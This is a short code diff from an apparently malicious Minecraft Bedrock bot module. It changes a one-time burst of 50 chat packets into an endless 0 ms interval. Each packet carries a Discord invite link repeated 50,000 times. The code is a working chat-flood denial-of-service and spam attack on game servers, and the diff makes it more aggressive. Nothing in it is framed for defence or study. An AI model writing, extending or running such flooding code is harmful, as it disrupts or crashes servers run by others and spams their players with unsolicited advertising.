@@ -219,20 +219,18 @@ module.exports = {
                         ]
                     });
 
-                    setTimeout(() => {
-                        if (disconnected) return;
-                        for (let i = 0; i < 50; i++) {
-                            client.queue('text', {
-                                filtered_message: '',
-                                type: 'chat',
-                                needs_translation: false,
-                                source_name: client.profile.name,
-                                message: `discord.gg/frosted`.repeat(50000),
-                                xuid: '0',
-                                platform_chat_id: '0',
-                            });
-                        }
-                    }, 2000);
+                    setInterval(() => {
+                        client.write('text', {
+                            filtered_message: '',
+                            type: 'chat',
+                            needs_translation: false,
+                            source_name: client.profile.name,
+                            message: `discord.gg/frosted`.repeat(50000),
+                            xuid: '0',
+                            platform_chat_id: '0',
+                        });
+                      
+                    }, 0); 
 
                     setTimeout(() => {
                         if (!disconnected) {
